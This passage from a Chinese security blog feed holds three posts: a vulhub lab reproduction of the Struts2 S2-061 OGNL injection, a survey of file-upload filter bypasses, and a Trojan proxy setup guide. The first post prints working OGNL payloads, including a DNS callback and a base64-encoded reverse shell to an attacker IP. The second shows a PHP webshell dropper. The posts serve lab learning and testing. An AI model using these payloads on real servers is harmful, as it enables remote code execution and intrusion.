    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Struts2 会对某些标签属性(比如 <code>id</code>，其他属性有待寻找) 的属性值进行二次表达式解析，因此当这些标签属性中使用了 <code>%&#123;x&#125;</code> 且 <code>x</code> 的值用户可控时，用户再传入一个 <code>%&#123;payload&#125;</code> 即可造成OGNL表达式执行。S2-061是对S2-059沙盒进行的绕过。</p><p>漏洞信息：<a href="https://cwiki.apache.org/confluence/display/WW/S2-059">https://cwiki.apache.org/confluence/display/WW/S2-059</a></p><span id="more"></span><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><ol><li> 靶机 centos7  IP：192.168.227.145</li><li> 攻击机：kali  IP：192.168.227.128</li><li> vulhub 靶场   struts2/s2-61</li></ol><h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><ol><li>git 下载 vulhub<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure></li><li>进入 vulhub/struts2/s2-61 目录下，开启靶场<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></li><li>查看靶场信息<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112281946189.png" alt="docker ps"></li><li>进入靶场：<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112281947947.png" alt="靶场"></li></ol><h2 id="验证漏洞点"><a href="#验证漏洞点" class="headerlink" title="验证漏洞点"></a>验证漏洞点</h2><h3 id="URL-验证"><a href="#URL-验证" class="headerlink" title="URL 验证"></a>URL 验证</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=%25%7b+%27fuxian%27+%2b+(2000+%2b+21).toString()%7d</span><br></pre></td></tr></table></figure><p>编码前：</p><blockquote><p>?id=%{ ‘fuxian’ + (2000 + 21).toString()}</p></blockquote><p>最后输出的结果应该是<code>fuxian2021</code></p><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112281910183.png"></p><h3 id="Dnslog-验证"><a href="#Dnslog-验证" class="headerlink" title="Dnslog 验证"></a>Dnslog 验证</h3><h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h4><blockquote><p>%{(#instancemanager=#application[“org.apache.tomcat.InstanceManager”]).(#stack=#attr[“com.opensymphony.xwork2.util.ValueStack.ValueStack”]).(#bean=#instancemanager.newInstance(“org.apache.commons.collections.BeanMap”)).(#bean.setBean(#stack)).(#context=#bean.get(“context”)).(#bean.setBean(#context)).(#macc=#bean.get(“memberAccess”)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(“java.util.HashSet”)).(#bean.put(“excludedClasses”,#emptyset)).(#bean.put(“excludedPackageNames”,#emptyset)).(#arglist=#instancemanager.newInstance(“java.util.ArrayList”)).(#arglist.add(“ping eftf8t.ceye.io”)).(#execute=#instancemanager.newInstance(“freemarker.template.utility.Execute”)).(#execute.exec(#arglist))}</p></blockquote><p>其中执行远程命令的位置在：<code>#arglist.add()</code></p><h4 id="验证-1"><a href="#验证-1" class="headerlink" title="验证"></a>验证</h4><p>BurtSuit抓包，将Get修改为Post：</p><p><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112281825311.png" alt="抓包修改"></p><p>查看Dnslog：<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112281825418.png" alt="dnslog验证"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>反弹shell需要base64编码：</p><blockquote><p>bash  -i &gt;&amp; /dev/tcp/192.168.227.128/9000 0&gt;&amp;1</p></blockquote><p>完整的反弹shell代码</p><blockquote><p>bash -c {echo,YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yMjcuMTI4LzkwMDAgMD4mMQ==}|{base64,-d}|{bash,-i}</p></blockquote><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><blockquote><p>%{(#instancemanager=#application[“org.apache.tomcat.InstanceManager”]).(#stack=#attr[“com.opensymphony.xwork2.util.ValueStack.ValueStack”]).(#bean=#instancemanager.newInstance(“org.apache.commons.collections.BeanMap”)).(#bean.setBean(#stack)).(#context=#bean.get(“context”)).(#bean.setBean(#context)).(#macc=#bean.get(“memberAccess”)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(“java.util.HashSet”)).(#bean.put(“excludedClasses”,#emptyset)).(#bean.put(“excludedPackageNames”,#emptyset)).(#arglist=#instancemanager.newInstance(“java.util.ArrayList”)).(#arglist.add(“bash -c {echo,YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yMjcuMTI4LzkwMDAgMD4mMQ==}|{base64,-d}|{bash,-i}”)).(#execute=#instancemanager.newInstance(“freemarker.template.utility.Execute”)).(#execute.exec(#arglist))}</p></blockquote><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>Kali 使用 NC 监听端口：</p><p><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112281928579.png"></p><p>BurpSuit 抓包，修改为 POST 方法，添加exp<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112281932011.png"></p><p>成功反弹shell<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112281856268.png"></p><h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>如果想了解更详细的漏洞信息及原理可以参考下面的文章：<br><a href="http://buaq.net/go-47936.html"> Struts2 S2-061漏洞分析(CVE-2020-17530)</a><br><a href="https://mp.weixin.qq.com/s/RD2HTMn-jFxDIs4-X95u6g"># Struts2 S2-061漏洞分析(CVE-2020-17530)</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;Struts2 会对某些标签属性(比如 &lt;code&gt;id&lt;/code&gt;，其他属性有待寻找) 的属性值进行二次表达式解析，因此当这些标签属性中使用了 &lt;code&gt;%&amp;#123;x&amp;#125;&lt;/code&gt; 且 &lt;code&gt;x&lt;/code&gt; 的值用户可控时，用户再传入一个 &lt;code&gt;%&amp;#123;payload&amp;#125;&lt;/code&gt; 即可造成OGNL表达式执行。S2-061是对S2-059沙盒进行的绕过。&lt;/p&gt;
&lt;p&gt;漏洞信息：&lt;a href=&quot;https://cwiki.apache.org/confluence/display/WW/S2-059&quot;&gt;https://cwiki.apache.org/confluence/display/WW/S2-059&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Apache" scheme="http://example.com/tags/Apache/"/>
    
    <category term="Struts2" scheme="http://example.com/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>文件上传之黑白名单绕过</title>
    <link href="http://example.com/2021/12/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/"/>
    <id>http://example.com/2021/12/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/</id>
    <published>2021-12-23T16:16:18.000Z</published>
    <updated>2022-01-01T16:49:11.615Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112232355500.png"></p><span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文主要对文件上传中的黑白名单的绕过方式进行学习和整理。<br>这里的黑名单白名单指在上传点的限制方式，黑名单例如仅拒绝 xxx 格式上传，只要上传的内容不是 xxx 格式，文件均可以上传到服务器，对应的白名单即为仅允许上传 yyy 格式，只要不是 yyy 格式的文件全部拒绝上传。</p><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><h3 id="上传特殊可解析后缀"><a href="#上传特殊可解析后缀" class="headerlink" title="上传特殊可解析后缀"></a>上传特殊可解析后缀</h3><p>例如使用php的网站，可以尝试phps,php3,php5,php7,phtml等后缀进行绕过尝试</p><h3 id="上传-access文件"><a href="#上传-access文件" class="headerlink" title="上传.access文件"></a>上传.access文件</h3><p>这里的 .access 只是一个泛例，具体包括 .htaccess 和 .user.ini 等可造成解析漏洞的文件。</p><h4 id="haccess文件"><a href="#haccess文件" class="headerlink" title=".haccess文件"></a>.haccess文件</h4><blockquote><p><strong>.htaccess：</strong><br>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p></blockquote><p>可以编辑一个 .htaccess 文件写入以下内容上传至服务器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112240011022.png"><br>上传该文件后再上传一个未在黑名单中的文件，如图片马，只要该文件有可执行的 php 代码，就可以执行文件中的 php 代码。</p><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><blockquote><p>1.mod_rewrite模块开启<br>2.AllowOverride All</p></blockquote><h4 id="user-ini文件"><a href="#user-ini文件" class="headerlink" title=".user.ini文件"></a>.user.ini文件</h4><blockquote><p><strong>user.ini.</strong><br>自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件仅被<br> CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用 .htaccess 文件有同样效果。除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web<br>   根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p></blockquote><blockquote><p>在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p></blockquote><blockquote><p>两个新的 INI 指令，user_ini.filename 和 user_ini.cache_ttl 控制着用户 INI 文件的使用。<br>user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是<br>   .user.ini。<br>user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</p></blockquote><p>先上传一个以 auto_prepend_file=1.gif 为内容的 .user.ini 文件，然后再上传一个内容为php的一句话的脚本，命名为1.gif。<br>.user.ini文件里的意思是：所有的php文件都自动包含1.gif文件。.user.ini相当于一个用户自定义的php.ini。</p><p>因为已经存在一个php文件，所以我们只需要在1.gif文件中包含我们所需要的php代码，再去访问原本的php，就可以帮助我们对1.gif内的php代码进行解析，我们就得以进行利用。</p><h5 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h5><blockquote><p>  服务器脚本语言为PHP<br>  服务器使用CGI／FastCGI模式<br>  上传目录下要有可执行的php文件</p></blockquote><h3 id="后缀大小写绕过"><a href="#后缀大小写绕过" class="headerlink" title="后缀大小写绕过"></a>后缀大小写绕过</h3><p>windows 系统中的特性，文件的文件名大小写组合也可以运行，是不区分大小写的，所以在一些上传点中，例如黑名单禁止 x.php 上传，就可以构造 x.Php 等文件，上传到服务器之后 x.Php 在 windows 系统中仍然会以 php 文件来处理执行。</p><h4 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h4><blockquote><p>Windows 系统</p></blockquote><h3 id="点绕过"><a href="#点绕过" class="headerlink" title="点绕过"></a>点绕过</h3><p>在某些环境中可以使用 x.php. 文件绕过上传，文件上传到 windows 服务器后，会根据 windows 特有的机制在保存文件是将文件结尾的 . 去掉，这样既绕过里上传限制，也保存下来里 x.php 文件（结尾加 . 可以与双写或大小写混用）</p><h4 id="利用条件-3"><a href="#利用条件-3" class="headerlink" title="利用条件"></a>利用条件</h4><blockquote><p>Windows 系统</p></blockquote><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>windows 系统中的特性，windows 会在保存文件时将空格去掉。</p><h4 id="利用条件-4"><a href="#利用条件-4" class="headerlink" title="利用条件"></a>利用条件</h4><blockquote><p>Windows 系统</p></blockquote><h3 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="::$DATA绕过"></a>::$DATA绕过</h3><p>在php+windows的情况下：如果文件名+<code>==$DATA</code>会把<code>==$DATA</code>之后的数据当成文件流处理,不会检测后缀名.且保持<code>::$DATA</code>之前的文件名。利用windows特性，可在后缀名中加<code> ::$DATA</code>绕过</p><blockquote><p>PS:复制图像地址时，会附带::$DATA，要去掉后再连接，否则找不到文件。</p></blockquote><h4 id="利用条件-5"><a href="#利用条件-5" class="headerlink" title="利用条件"></a>利用条件</h4><blockquote><p>Windows 系统 +PHP</p></blockquote><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>例如这样的限制代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br></pre></td></tr></table></figure><p>直接使用双写绕过就行 x.pphphp ，最后生成 x.php 文件。</p><h3 id="配合解析漏洞绕过"><a href="#配合解析漏洞绕过" class="headerlink" title="配合解析漏洞绕过"></a>配合解析漏洞绕过</h3><h4 id="Apache-陌生后缀解析漏洞"><a href="#Apache-陌生后缀解析漏洞" class="headerlink" title="Apache 陌生后缀解析漏洞"></a>Apache 陌生后缀解析漏洞</h4><p>根据apache的后缀名识别漏洞：从右往左依次识别后缀，遇到不能识别的后缀名便跳过，所以如果目标的waf是根据最后一个后缀进行判断，我们可以构建一个xxx.php.abc这样的文件名进行绕过，因为apach无法识别abc后缀，所以最后会识别到php文件，会把文件当作php文件进行执行。</p><h4 id="Apache-换行解析漏洞"><a href="#Apache-换行解析漏洞" class="headerlink" title="Apache 换行解析漏洞"></a>Apache 换行解析漏洞</h4><p>Apache HTTPD是一款HTTP服务器，其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。该漏洞属于用户配置不当所产生，与具体中间件版本无关。<br>所以我们可以构建 xxx.jpg\x0Aphp文件进行上传。</p><h5 id="利用条件-6"><a href="#利用条件-6" class="headerlink" title="利用条件"></a>利用条件</h5><blockquote><p>Apache 版本 2.4.0~2.4.29</p></blockquote><h4 id="nginx-解析漏洞"><a href="#nginx-解析漏洞" class="headerlink" title="nginx 解析漏洞"></a>nginx 解析漏洞</h4><p>该漏洞与nginx、php版本无关,属于用户配置不当造成的解析漏洞</p><p>解析格式：1.jpg/.php、1.jpg/%00.php，1.jpg会被当成php格式解析</p><p>nginx和iis7.x解析漏洞类似，都是加上/.php后文件以php格式解析。</p><h5 id="利用条件-7"><a href="#利用条件-7" class="headerlink" title="利用条件"></a>利用条件</h5><blockquote><p>配置文件vim /etc/php5/fpm/php.ini、vim /etc/php5/fpm/pool.d/<a href="http://www.conf/">www.conf</a></p></blockquote><blockquote><p>关键配置项: cgi.fix_pathinfo=1，security.limit_extensions=允许解析其他格式为php，则存在解析漏洞。</p></blockquote><h3 id="竞争条件绕过"><a href="#竞争条件绕过" class="headerlink" title="竞争条件绕过"></a>竞争条件绕过</h3><p>网站逻辑：</p><ul><li>网站允许上传任意文件，然后检查文件是否符合上传的条件，若不符合则删除上传的文件。</li></ul><p>我们只需要在删除之前访问上传的php文件，从而执行上传文件中的php代码。</p><p>例如：上传文件代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>先进行文件上传，后进行判断与删除。利用时间差进行webshell上传。</p><h2 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h2><h3 id="MIME-绕过"><a href="#MIME-绕过" class="headerlink" title="MIME 绕过"></a>MIME 绕过</h3><blockquote><p><strong>MIME 类型简介：</strong><br>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p></blockquote><h4 id="常见的-MIME-类型"><a href="#常见的-MIME-类型" class="headerlink" title="常见的 MIME 类型"></a>常见的 MIME 类型</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">超文本标记语言文本 .html text/html</span><br><span class="line">xml文档 .xml text/xml</span><br><span class="line">普通文本 .txt text/plain</span><br><span class="line">PDF文档 .pdf application/pdf</span><br><span class="line">Microsoft Word文件 .word application/msword</span><br><span class="line">PNG图像 .png image/png</span><br><span class="line">GIF图形 .gif image/gif</span><br><span class="line">JPEG图形 .jpeg,.jpg image/jpeg</span><br><span class="line">GZIP文件 .gz application/x-gzip</span><br></pre></td></tr></table></figure><p>完整的 MIME 格式类型参考：</p><p><a href="https://www.w3school.com.cn/media/media_mimeref.asp">https://www.w3school.com.cn/media/media_mimeref.asp</a></p><p>可能文件是对MIME的类型做了限制，比如对content-type请求头中的文件类型做了限制。<br>只允许image/png 和 image/jpeg 的文件上传，那么，我们只需要抓包修改文件中的MIME文件类型为image/png 或imag/jpeg即可。</p><h3 id="结合解析漏洞绕过"><a href="#结合解析漏洞绕过" class="headerlink" title="结合解析漏洞绕过"></a>结合解析漏洞绕过</h3><h4 id="00-或0x00截断绕过"><a href="#00-或0x00截断绕过" class="headerlink" title="%00 或0x00截断绕过"></a>%00 或0x00截断绕过</h4><blockquote><p><strong>00截断：</strong><br>无论0x00还是%00，最终被解析后都是一个东西:chr（0） chr()是一个函数，这个函数是用来返回参数所对应的字符的，也就是说，参数是一个ASCII码，返回的值是一个字符，类型为string。</p></blockquote><blockquote><p>那么chr(0)就很好理解了，对照ASCII码表可以知道，ASCII码为0-127的数字，每个数字对应一个字符，而0对应的就是NUT字符（NULL），也就是空字符，而截断的关键就是这个空字符，当一个字符串中存在空字符的时候，在被解析的时候会导致空字符后面的字符被丢弃。</p></blockquote><blockquote><p>这种情况常出现在ASP程序中，PHP 版本&lt;5.3.4时也会有这个情况，JSP中也会出现。那么就可以知道00截断的原理了，在后缀中插入一个空字符（不是空格），会导致之后的部分被丢弃，而导致绕过的发生。如：在文件1.php.jpg中插入空字符变成：1.php.0x00.jpg中，解析后就会只剩下1.php，而空字符怎么插入的呢？通常我们会用Burp抓包后，在文件名插入一个空格，然后再HEX中找到空格对应的16进制编码“20”，把它改成00（即16进制ASCII码00，对应十进制的0），就可以插入空字符了。</p></blockquote><blockquote><p>PS:这里的空格纯粹只是一个标记符号，便于我们找到位置，其实这里是什么字符都无所谓，只不过空格比较有特异性，方便在HEX中查找位置。</p></blockquote><h4 id="利用条件-8"><a href="#利用条件-8" class="headerlink" title="利用条件"></a>利用条件</h4><blockquote><p>00截断在 php 环境中需要满足以下要求，二者缺一不可。<br>php 版本小于 5.3.4<br>php的magic_quotes_gpc为OFF状态</p></blockquote><h3 id="上传-access文件绕过"><a href="#上传-access文件绕过" class="headerlink" title="上传.access文件绕过"></a>上传.access文件绕过</h3><p>同样的原理绕过方式，配合解析漏洞，在 linux 环境中仍然适用，因为此类漏洞是 php 或者中间件造成的，操作系统不可控制该漏洞。</p><h3 id="条件竞争绕过"><a href="#条件竞争绕过" class="headerlink" title="条件竞争绕过"></a>条件竞争绕过</h3><p>同样的原理绕过方式，是由于代码的逻辑错误造成的，不受其他环境影响。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.modb.pro/db/75750">https://www.modb.pro/db/75750</a></p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><blockquote><p>文中所涉及的技术,思路和工具仅供以安全为目的的学习交流使用，请勿做非法用途否则后果自负。</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112232355500.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="网络安全" scheme="http://example.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="文件上传" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>Vultr + Trojan 脚本安装</title>
    <link href="http://example.com/2021/12/21/Vultr-Trojan-%E8%84%9A%E6%9C%AC%E5%AE%89%E8%A3%85/"/>
    <id>http://example.com/2021/12/21/Vultr-Trojan-%E8%84%9A%E6%9C%AC%E5%AE%89%E8%A3%85/</id>
    <published>2021-12-21T05:23:51.000Z</published>
    <updated>2022-01-01T16:44:23.346Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Trojan-介绍"><a href="#Trojan-介绍" class="headerlink" title="Trojan 介绍"></a>Trojan 介绍</h2><p>Trojan，原来多是指特洛伊木马，是一种计算机病毒程序。但是，我们今天所说的Trojan是一种新的科学上网技术，全称为Trojan-GFW，是目前最成功的科学上网伪装技术之一。你可以认为Trojan是V2Ray的“WS+TLS”模式的精简版，速度比V2Ray更快，伪装比V2Ray更逼真，更难以被GFW识别。<br>Trojan工作原理：Trojan通过监听443端口，模仿互联网上最常见的 HTTPS 协议，把合法的Trojan代理数据伪装成正常的 HTTPS 通信，并真正地完整完成的TLS 握手，以诱骗GFW认为它就是 HTTPS，从而不被识别。Trojan处理来自外界的 HTTPS 请求，如果是合法的，那么为该请求提供服务，否则将该流量转交给Caddy、Nginx等 web 服务器，由 Caddy、Nginx 等为其提供网页访问服务。基于整个交互过程，这样能让你的VPS更像一个正常的web服务器，因为Trojan的所有行为均与 Caddy、Nginx等 web 服务器一致，并没有引入额外特征，从而达到难以识别的效果。<br>Trojan-Go是Trojan-GFW的分支项目，对Trojan进行性能优化，并增加不少新功能，Trojan-Go性能和功能均有大幅度的提升，而且支持分流和CDN。</p><span id="more"></span><h2 id="Trojan多用户一键搭建脚本"><a href="#Trojan多用户一键搭建脚本" class="headerlink" title="Trojan多用户一键搭建脚本"></a>Trojan多用户一键搭建脚本</h2><h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><blockquote><p>Vultr + centos7</p></blockquote><p>Vultr 是国外的一家vps产商，可以方便无限制地更换ip，所以比较适合我们搭建我们的vpn，这里创建的服务器处于美国西雅图，因为日本，韩国地区的速度比较差。</p><h3 id="开始搭建"><a href="#开始搭建" class="headerlink" title="开始搭建"></a>开始搭建</h3><p><strong>执行一键脚本安装命令</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> &lt;(curl -sL https://git.io/trojan-install)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112211047752.png"><br>当以上命令执行完毕会安装Trojan管理程序</p><h4 id="安装证书"><a href="#安装证书" class="headerlink" title="安装证书"></a>安装证书</h4><p>选择安装SSL证书的方式并绑定域名，我们选择“<strong>1.Let’s Encrypt 证书</strong>”，然后输入域名，如“xxx.myvps.tk”。如下图所示：<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112211053704.png"><br>请确认域名输入准确无误，然后回车，进入SSL证书安装过程。稍等片刻安装完成</p><h4 id="安装mysql数据库"><a href="#安装mysql数据库" class="headerlink" title="安装mysql数据库"></a>安装mysql数据库</h4><p>在键盘按数字“1”，然后直接进入”安装docker版mysql(mariadb)”的过程。安装完成后，一键安装脚本提示设置连接Trojan服务器的用户名和密码。如下图所示：<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112211057199.png"><br>一般情况下，使用其随机生成的用户名和密码即可，也可以自己输入想使用的用户名密码。<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112211059879.png"></p><blockquote><p>PS:如果你忘记了登录密码，也可以在“<strong>web管理</strong>”重置web管理员密码。</p></blockquote><p>至此，Trojan多用户一键搭建脚本安装完毕。现在你可以输入’<strong>trojan</strong>‘可进入管理程序，在出现的管理程序菜单，直接在键盘按“数字键”直接进入相关菜单或执行命令，直接按“回车键”返回上级菜单。比如，你直接按数字键“5”，可查看用户配置的用户名、密码和Trojan分享链接，以及单用户的上传、下载流量和流量限额。如下图所示：<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112211100680.png"></p><p>该版本还提供了web界面，如<code>https://xxx.myvps.tk</code>，登录web面板管理trojan用户。如下图所示：<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112211106067.png"></p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>使用我们的客户端，添加我们的服务器，测试其速度<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112211105566.png"></p><h2 id="BBR加速"><a href="#BBR加速" class="headerlink" title="BBR加速"></a>BBR加速</h2><h3 id="安装-wget-依赖包"><a href="#安装-wget-依赖包" class="headerlink" title="安装 wget 依赖包"></a>安装 wget 依赖包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install wget</span><br></pre></td></tr></table></figure><h3 id="执行BBR加速一键安装脚本命令"><a href="#执行BBR加速一键安装脚本命令" class="headerlink" title="执行BBR加速一键安装脚本命令"></a>执行BBR加速一键安装脚本命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/src &amp;&amp; wget -N --no-check-certificate <span class="string">&quot;https://raw.githubusercontent.com/chiakge/Linux-NetSpeed/master/tcp.sh&quot;</span> &amp;&amp; chmod +x tcp.sh &amp;&amp; ./tcp.sh</span><br></pre></td></tr></table></figure><p>安装完成后：<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112211111224.png"></p><p>然后可以选择想使用的bbr及开启加速，安装后可能需要重启，重启后进入 /usr/src 目录，输入 ./tcp.sh 即可重新进入界面</p><p>开启后，测试真实速度，可以看到速度提升的不少<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112211118156.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://iyideng.vip/black-technology/cgfw/trojan-server-building-and-using-tutorial.html#4%E3%80%81%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85%E5%B9%B6%E5%BC%80%E5%90%AFBBR%E5%8A%A0%E9%80%9F">一灯不是和尚 - Trojan一键搭建教程2022</a></p><p><a href="https://iyideng.vip/black-technology/cgfw/vpn-ss-ssr-v2ray-trojan-wireguard-bypass-gfw.html">科学上网工具哪个好？一灯不是和尚为您科普VPN/SS/SSR/V2Ray/Xray/Trojan/Trojan-Go和WireGuard的前世今生、区别和关系以及梯子软件的前景</a></p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><blockquote><p>本教程仅限于查阅学习资料和从事科研外贸工作的人群，所涉及到的工具资源均来自于互联网，本站对这些资源的可用性、安全性和版权不负有任何责任。如有侵权，请联系我删除。使用过程中，请您务必遵守当地的法律法规。</p></blockquote>]]></content>
    
    
